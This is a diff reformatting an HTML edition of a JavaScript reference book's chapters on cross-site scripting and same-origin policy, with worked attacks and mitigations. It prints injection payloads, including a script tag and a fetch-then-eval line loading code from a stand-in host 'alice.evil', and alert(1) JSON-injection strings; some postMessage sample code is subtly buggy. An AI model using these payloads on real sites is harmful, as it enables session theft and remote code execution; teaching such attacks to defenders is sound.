@@ -23384,508 +23384,239 @@ cute puppies</a>, nothing happens!
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch95-2">Section 95.2: Persistent Cross-site scripting (XSS)</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-Let&apos;s say that Bob owns a social website that allows users to
-personalize their profiles.
-Alice goes to Bob&apos;s website, creates an account, and goes to her
+<p>Let&apos;s say that Bob owns a social website that allows users to
+personalize their profiles.</p>
+<p>Alice goes to Bob&apos;s website, creates an account, and goes to her
 profile settings. She sets her profile description to I&apos;m actually
-too lazy to write something here.
-When her friends view her profile, this code gets run on the server:
-<b>if</b>
-(
-viewedPerson.
-profile
-.
-description
-)
-{
-page
-+=
-&quot;&lt;div&gt;&quot;
-&plus;
-viewedPerson.
-profile
-.
-description
-&plus;
-&quot;&lt;/div&gt;&quot;
-;
+too lazy to write something here.</p>
+<p>When her friends view her profile, this code gets run on the server:</p>
+<pre>
+<b>if</b>(viewedPerson.profile.description) {
+  page += &quot;&lt;div&gt;&quot; &plus; viewedPerson.profile.description &plus; &quot;&lt;/div&gt;&quot;;
+} <b>else</b> {
+  page += &quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;;
 }
-<b>else</b>
-{
-page
-+=
-&quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;
-;
-}
-Resulting in this HTML:
-<b>&lt;</b>
-<b>div</b>
-<b>&gt;</b>
-I&apos;m actually too lazy to write something here.
-<b>&lt;</b>
-<b>/div</b>
-<b>&gt;</b>
+</pre>
+<p>Resulting in this HTML:</p>
+<pre>
+<b>&lt;</b><b>div</b><b>&gt;</b>I&apos;m actually too lazy to write something here.<b>&lt;</b><b>/div</b><b>&gt;</b>
 <b>&lt;b</b>   <b>&gt;</b>   I like HTML<b>&lt;/b></b>
 Than Alice sets her profile description to <b>&gt;</b>. When she visits her
 profile, instead of seeing
+<blockquote>
 &lt;b&gt;I like HTML&lt;/b&gt;
-she sees
+</blockquote>
+<p>she sees</p>
+<blockquote>
 <b>I like HTML</b>
-Then Alice sets her profile to
+</blockquote>
+<p>Then Alice sets her profile to</p>
+<pre>
 <b>&lt;</b>
-<b>script</b>
-src =
-&quot;https://alice.evil/profile_xss.js&quot;
-<b>&gt;</b>
-<b>&lt;</b>
-<b>/script</b>
-<b>&gt;</b>
-I
-&apos;m actually too lazy to write something
-here.
-Whenever someone visits her profile, they get Alice&apos;s script run on
-Bob&apos;s website while logged on as their account.
-<b>Mitigation</b>
-1.  Escape angle brackets in profile descriptions, etc.
-
-2.  Store profile descriptions in a plain text file that is then fetched
-    with a script that adds the description via
-.innerText
-3.  <b>Add a [Content Security
-    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
-    to load active content from other domains</b>
+<b>script</b> src = &quot;https://alice.evil/profile_xss.js&quot;<b>&gt;&lt;/script&gt;</b>I&apos;m actually too lazy to write something here.
+</pre>
+<p>Whenever someone visits her profile, they get Alice&apos;s script run on Bob&apos;s website while logged on as their account.</p>
+<p><b>Mitigation</b></p>
+<ol type="1" start="1">
+  <li>Escape angle brackets in profile descriptions, etc.</li>
+  <li>Store profile descriptions in a plain text file that is then fetched
+    with a script that adds the description via .innerText</li>
+  <li><b>Add a <a href="https://stackoverflow.com/q/30280370/6560716">
+    Content Security Policy</a> that refuses to load active content from other domains</b></li>
+</ol>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch95-3">Section 95.3: Persistent Cross-site scripting from JavaScript string literals</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-Let&apos;s say that Bob owns a site that lets you post public messages.
-The messages are loaded by a script that looks like this:
-addMessage
-(
-&quot;Message 1&quot;
-)
-;
-addMessage
-(
-&quot;Message 2&quot;
-)
-;
-addMessage
-(
-&quot;Message 3&quot;
-)
-;
-addMessage
-(
-&quot;Message 4&quot;
-)
-;
-addMessage
-(
-&quot;Message 5&quot;
-)
-;
-addMessage
-(
-&quot;Message 6&quot;
-)
-;
-The addMessage function adds a posted message to the DOM. However, in
-an effort to avoid XSS, <b>any HTML in messages posted is escaped.</b>
-The script is generated <b>on the server</b> like this:
-<b>for</b>
-(
-<b>var</b>
-i
-=
-0
-;
-i
-&lt;
-messages.
-length
-;
-i
-++
-)
-{
-script
-+=
-&quot;addMessage(
-<b>&bsol;&amp;quot;</b>
-&quot;
-&plus;
-messages
-&lbrack;
-i
-&rbrack;
-&plus;
-&quot;
-<b>&bsol;&amp;quot;</b>
-)
-;&quot;
-;
+<p>Let&apos;s say that Bob owns a site that lets you post public messages.</p>
+<p>The messages are loaded by a script that looks like this:</p>
+<pre>
+addMessage(&quot;Message 1&quot;);
+addMessage(&quot;Message 2&quot;);
+addMessage(&quot;Message 3&quot;);
+addMessage(&quot;Message 4&quot;);
+addMessage(&quot;Message 5&quot;);
+addMessage(&quot;Message 6&quot;);
+</pre>
+<p>The addMessage function adds a posted message to the DOM. However, in
+an effort to avoid XSS, <b>any HTML in messages posted is escaped.</b></p>
+<p>The script is generated <b>on the server</b> like this:</p>
+<pre>
+<b>for</b>(<b>var</b>i = 0; i &lt; messages.length; i++) {
+  script += &quot;addMessage(<b>&bsol;&quot;</b>&quot; &plus; messages&lbrack;i&rbrack; &plus; &quot;<b>&bsol;&quot;</b>);&quot;;
 }
-My mom said :   &quot;Life is good. Pie makes it better. &quot;
-So alice posts a message that says: . Than when she previews the
-message, instead of seeing her message she sees an error in the
-console:
-Uncaught SyntaxError
-:
-missing
-)
-after argument list
-Why? Because the generated script looks like this:
-addMessage
-(
-&quot;My mom said: &quot;
-Life is good.
-Pie
-makes it better.
-&quot;&quot;
-)
-;
-That&apos;s a syntax error. Than Alice posts:
-I like pie
-&quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//</i>
-Then the generated script looks like: addMessage(&quot;I like pie
-&quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
-<b>https</b>    <b>:</b>   <b><i>// alice.evil/js_xss.js</i></b>
-That adds the message I like pie, but it also <b>downloads and runs
-whenever someone visits Bob&apos;s site.</b>
-<b>Mitigation:</b>
-1.  Pass the message posted into JSON.stringify()
-2.  Instead of dynamically building a script, build a plain text file
-    containing all the messages that is later fetched by the script
-3.  <b>Add a [Content Security
-    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
-    to load active content from other domains</b>
+</pre>
+<p>So alice posts a message that says: My mom said: &quot;Life is good. Pie makes it better. &quot;. 
+Than when she previews the message, instead of seeing her message she sees an error in the console:</p>
+<pre>
+Uncaught SyntaxError: missing ) after argument list
+</pre>
+<p>Why? Because the generated script looks like this:</p>
+<pre>
+addMessage(&quot;My mom said: &quot;Life is good. Pie makes it better. &quot;&quot;);
+</pre>
+<p>That&apos;s a syntax error. Than Alice posts:</p>
+<pre>
+I like pie &quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//</i>
+</pre>
+<p>Then the generated script looks like:</p>
+<pre>
+addMessage(&quot;I like pie &quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
+<p>That adds the message I like pie, but it also <b>downloads and runs
+<b>https:<i>// alice.evil/js_xss.js</i></b> whenever someone visits Bob&apos;s site.</b></p>
+<p><b>Mitigation:</b></p>
+<ol type="1" start="1">
+  <li>Pass the message posted into JSON.stringify()</li>
+  <li>Instead of dynamically building a script, build a plain text file
+    containing all the messages that is later fetched by the script.</li>
+  <li><b>Add a <a href="https://stackoverflow.com/q/30280370/6560716">
+    Content Security Policy</a> that refuses to load active content from other domains</b></li>
+</ol>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch95-4">Section 95.4: Why scripts from other people can harm your website and its visitors</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-If you don&apos;t think that malicious scripts can harm your site, <b>you
-are wrong</b>. Here is a list of what a malicious script could do:
-1.  Remove itself from the DOM so that <b>it can&apos;t be traced</b>
-2.  Steal users&apos; session cookies and <b>enable the script author to log
-    in as and impersonate them</b>
-3.  Show a fake &quot;Your session has expired. Please log in again.&quot;
-    message that <b>sends the user&apos;s password to the script author</b>.
-4.  Register a malicious service worker that runs a malicious script
-    <b>on every page visit</b> to that website.
-5.  Put up a fake paywall demanding that users <b>pay money</b> to access
-    the site <b>that actually goes to the script author</b>.
-Please, <b>don&apos;t think that XSS won&apos;t harm your website and its
-visitors.</b>
+<p>If you don&apos;t think that malicious scripts can harm your site, <b>you are wrong</b>. 
+Here is a list of what a malicious script could do:</p>
+<!-- page 424 -->
+<ol type="1" start="1">
+  <li>Remove itself from the DOM so that <b>it can&apos;t be traced</b></li>
+  <li>Steal users&apos; session cookies and <b>enable the script author to log
+    in as and impersonate them</b></li>
+  <li>Show a fake &quot;Your session has expired. Please log in again.&quot;
+    message that <b>sends the user&apos;s password to the script author</b>.</li>
+  <li>Register a malicious service worker that runs a malicious script
+    <b>on every page visit</b> to that website.</li>
+  <li>Put up a fake paywall demanding that users <b>pay money</b> to access
+    the site <b>that actually goes to the script author</b>.</li>
+</ol>
+<p>Please, <b>don&apos;t think that XSS won&apos;t harm your website and its
+visitors.</b></p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch95-5">Section 95.5: Evaled JSON injection</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-Let&apos;s say that whenever someone visits a profile page in Bob&apos;s
-website, the following URL is fetched:
-https
-:
-// <i>example.com/api/users/1234/profiledata.json</i>
-With a response like this:
+<p>Let&apos;s say that whenever someone visits a profile page in Bob&apos;s website, 
+the following URL is fetched:</p>
+<pre>
+https:// <i>example.com/api/users/1234/profiledata.json</i>
+</pre>
+<p>With a response like this:</p>
+<pre>
 {
-&quot;name&quot;
-:
-&quot;Bob&quot;
-,
-&quot;description&quot;
-:
-&quot;Likes pie & security holes.&quot;
+  &quot;name&quot;: &quot;Bob&quot;,
+  &quot;description&quot;: &quot;Likes pie & security holes.&quot;
 }
-Than that data is parsed & inserted:
+</pre>
+<p>Than that data is parsed & inserted:</p>
+<pre>
 <b>var</b> data = eval(&quot;(&quot; + resp + &quot;)&quot;);
 document.getElementById(&quot;#name&quot;).innerText = data.name;
-document.getElementById(&quot;#description&quot;).innerText =
-data.description;
-Seems good, right? <b>Wrong.</b>
-Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
-XSS.
-What if someone&apos;s description is ?
-Seems weird, but if poorly done, the response will be:
+document.getElementById(&quot;#description&quot;).innerText = data.description;
+</pre>
+<p>Seems good, right? <b>Wrong.</b></p>
+<p>What if someone&apos;s description is Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
+XSS.?</p>
+<p>Seems weird, but if poorly done, the response will be:</p>
+<pre>
 {
-&quot;name&quot;
-:
-&quot;Alice&quot;
-,
-&quot;description&quot;
-:
-&quot;Likes pie & security holes.&quot;
-}
-)
-;
-alert
-(
-1
-)
-;
-(
-{
-&quot;name&quot;
-:
-&quot;Alice&quot;
-,
-&quot;description&quot;
-:
-&quot;Likes
+  &quot;name&quot;: &quot;Alice&quot;,
+  &quot;description&quot;: &quot;Likes pie & security holes.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;, &quot;description&quot;:&quot;Likes
 XSS.&quot;
 }
-And this will be
-eval
-ed:
-(
-{
-&quot;name&quot;
-:
-&quot;Alice&quot;
-,
-&quot;description&quot;
-:
-&quot;Likes pie & security holes.&quot;
-}
-)
-;
-alert
-(
-1
-)
-;
-(
-{
-&quot;name&quot;
-:
-&quot;Alice&quot;
-,
-&quot;description&quot;
-:
-&quot;Likes
+</pre>
+<p>And this will be evaled:</p>
+<pre>
+({
+  &quot;name&quot;: &quot;Alice&quot;,
+  &quot;description&quot;: &quot;Likes pie & security holes.&quot;});alert(1);({&quot;name&quot;: &quot;Alice&quot;, &quot;description&quot;:&quot;Likes
 XSS.&quot;
-}
-)
-If you don&apos;t think that&apos;s a problem, paste that in your console and
-see what happens.
-<b>Mitigation</b>
-<b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
-eval, and definitely don&apos;t use eval with something a user could
-control. Eval [creates a new execution
-context](http://dmitrysoshnikov.com/ecmascript/chapter-1-execution-contexts/),
-creating a <b>performance hit</b>.
-Properly escape
-&quot;
-and
-&bsol;&bsol;
-in user data before putting it in JSON. If you just escape the
-&quot;
-, than this will happen:
-Hello
-!
-&bsol;&bsol;
-&quot;});alert(1);({
-Will be converted to:
-&quot;Hello!
-<b>&bsol;&bsol;&amp;ast;</i>
-&quot;
-}
-)
-;
-alert
-(
-1
-)
-;
-(
-{
-&quot;
-Oops. Remember to escape both the &bsol;&bsol; and &quot;, or just use JSON.parse.
+})
+</pre>
+<p>If you don&apos;t think that&apos;s a problem, paste that in your console and see what happens.</p>
+<p><b>Mitigation</b></p>
+<ul>
+  <li><b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
+    eval, and definitely don&apos;t use eval with something a user could
+	control. Eval <a href="http://dmitrysoshnikov.com/ecmascript/chapter-1-execution-contexts/">
+	creates a new execution context</a>, creating a <b>performance hit</b>.</li>
+  <li>Properly escape &quot; and &bsol; in user data before putting it in JSON. 
+    If you just escape the &quot;, than this will happen:
+<pre>
+Hello! &bsol;&bsol;&quot;});alert(1);({
+</pre>
+<p>Will be converted to:</p>
+<pre>
+&quot;Hello! <b>&bsol;&bsol;&quot;</i>});alert(1);({&quot;
+</pre>
+<p>Oops. Remember to escape both the &bsol; and &quot;, or just use JSON.parse.</p>
+</li>
+</ul>
+<!-- page 426 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch96">Chapter 96: Same Origin Policy & CrossOrigin Communication</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-Same-Origin policy is used by web browsers to prevent scripts to be
+<p>Same-Origin policy is used by web browsers to prevent scripts to be
 able to access remote content if the remote address has not the same
 <b>origin</b> of the script. This prevents malicious scripts from
-performing requests to other websites to obtain sensitive data.
-The <b>origin</b> of two addresses is considered the same if both URLs
-have the same <i>protocol</i>, <i>hostname</i> and <i>port</i>.
+performing requests to other websites to obtain sensitive data.</p>
+<p>The <b>origin</b> of two addresses is considered the same if both URLs
+have the same <i>protocol</i>, <i>hostname</i> and <i>port</i>.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch96-1">Section 96.1: Safe cross-origin communication with messages</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--
-window.postMessage()   method together with its relative  window.onmessage
-event handler      
-The can be safely used to enable cross-origin communication.
-postMessage()
-postMessage()
-The method of the target window can be called to send a message to
+<p>The window.postMessage() method together with its relative event handler window.onmessage can 
+be safely used to enable cross-origin communication.</p>
+<p>The postMessage() method of the target window can be called to send a message to
 another window, which will be able to intercept it with its onmessage
 event handler, elaborate it, and, if necessary, send a response back
-to the sender window using again.
-
-<b>Example of Window communicating with a children frame</b>
-Content of
-http
-:
-// <i>main-site.com/index.html</i>
-:
+to the sender window using postMessage() again.</p>
+<p><b>Example of Window communicating with a children frame</b></p>
+<ul>
+  <li>Content of http:// <i>main-site.com/index.html</i>:
+<pre>
+<i>&lt;!&dash;&dash; &hellip; &dash;&dash;;&gt;</i>
+<b>&lt;iframe</b> id=&quot;frame-id&quot; src=&quot;http://other-site.com/index.html&quot;<b>&gt;&lt;/iframe&gt;</b>
+<b>&lt;script</b> src=&quot;main_site_script.js&quot;<b>&gt;&lt;/script&gt;</b>
+<i>&lt;!&dash;&dash; &hellip; &dash;&dash;&gt;</i>
+</pre>
+  </li>
+  <li>Content of http:// <i>other-site.com/index.html</i>:
+<pre>
+<i>&lt;!&dash;&dash; &hellip; &dash;&dash;&gt;</i>
+<b>&lt;</b><b>script</b> src=&quot;other_site_script.js&quot;<b>&gt;</b><b>&lt;</b><b>/src</b><b>&gt;</b>
 <i>&lt;!&bsol; &hellip; &amp;gt;</i>
-<b>&lt;</b>
-<b>iframe</b>
-id
-=
-&quot;frame-id&quot;
-src
-=
-&quot;http://other-site.com/index.html&quot;
-<b>&gt;</b>
-<b>&lt;</b>
-<b>/iframe</b>
-<b>&gt;</b>
-<b>&lt;</b>
-<b>script</b>
-src
-=
-&quot;main_site_script.js&quot;
-<b>&gt;</b>
-<b>/script</b>
-<b>&lt;</b>
-<b>&gt;</b>
-<i>&lt;!&bsol; &hellip; &amp;gt;</i>
-Content of
-http
-:
-// <i>other-site.com/index.html</i>
-:
-<i>&lt;!&bsol; &hellip; &amp;gt;</i>
-<b>&lt;</b>
-<b>script</b>
-src
-=
-&quot;other_site_script.js&quot;
-<b>&gt;</b>
-<b>&lt;</b>
-<b>/src</b>
-<b>&gt;</b>
-<i>&lt;!&bsol; &hellip; &amp;gt;</i>
-Content of
-main_site_script.
-js
-:
+</pre>
+</li>
+  <li>Content of main_site_script.js:
+<pre>
 // <i>Get the &lt;iframe&gt;&apos;s window</i>
-<b>var</b>
-frameWindow
-=
-document.
-getElementById
-(
-&apos;frame-id&apos;
-)
-.
-contentWindow
-;
+<b>var</b> frameWindow = document.getElementById(&apos;frame-id&apos;).contentWindow;
 // <i>Add a listener for a response</i>
-
-window.
-addEventListener
-(
-&apos;message&apos;
-,
-<b>function</b>
-(
-evt
-)
-{
-// <i>IMPORTANT: Check the origin of the data!</i>
-<b>if</b>
-(
-event.
-origin
-.
-indexOf
-(
-&apos;http://other-site.com&apos;
-)
-==
-0
-)
-{
-// <i>Check the response</i>
-console.
-log
-(
-evt.
-data
-)
-;
-<i>/&ast; &hellip; &ast;/</i>
-}
-}
-)
-;
+window.addEventListener(&apos;message&apos;, <b>function</b>(evt) {
+  // <i>IMPORTANT: Check the origin of the data!</i>
+  <b>if</b> (event.origin.indexOf(&apos;http://other-site.com&apos;) == 0) {
+    // <i>Check the response</i>
+    console.log(evt.data);
+    <i>/&ast; &hellip; &ast;/</i>
+  }
+});
 // <i>Send a message to the frame&apos;s window</i>
-frameWindow.
-postMessage
-(
-<i>/&ast; any obj or var &ast;/</i>
-,
-&apos;&ast;&apos;
-)
-;
-Content of
-other_site_script.
-js
-:
-window.
-addEventListener
-(
-&apos;message&apos;
-,
-<b>function</b>
-(
-evt
-)
-{
-// <i>IMPORTANT: Check the origin of the data!</i>
-<b>if</b>
-(
-event.
-origin
-.
-indexOf
-(
-&apos;http://main-site.com&apos;
-)
-==
-0
-)
-{
-// <i>Read and elaborate the received data</i>
-console.
-log
-(
-evt.
-data
-)
-;
-<i>/&ast; &hellip; &ast;/</i>
-// <i>Send a response back to the main window</i>
-window.
-parent
-.
-postMessage
-(
-<i>/&ast; any obj or var &ast;/</i>
-,
-&apos;&ast;&apos;
-)
-;
-}
-}
-)
-;
+frameWindow.postMessage(<i>/&ast; any obj or var &ast;/</i>, &apos;&ast;&apos;);
+</pre>
+  </li>
+  <li>Content of other_site_script.js:
+<pre>
+window.addEventListener(&apos;message&apos;, <b>function</b>(evt) {
+  // <i>IMPORTANT: Check the origin of the data!</i>
+  <b>if</b> (event.origin.indexOf(&apos;http://main-site.com&apos;) == 0) {
+    // <i>Read and elaborate the received data</i>
+    console.log(evt.data);
+    <i>/&ast; &hellip; &ast;/</i>
+    // <i>Send a response back to the main window</i>
+    window.parent.postMessage(<i>/&ast; any obj or var &ast;/</i>, &apos;&ast;&apos;);
+  }
+});
+</pre>
+</li>
+</ul>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch96-2">Section 96.2: Ways to circumvent Same-Origin Policy</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
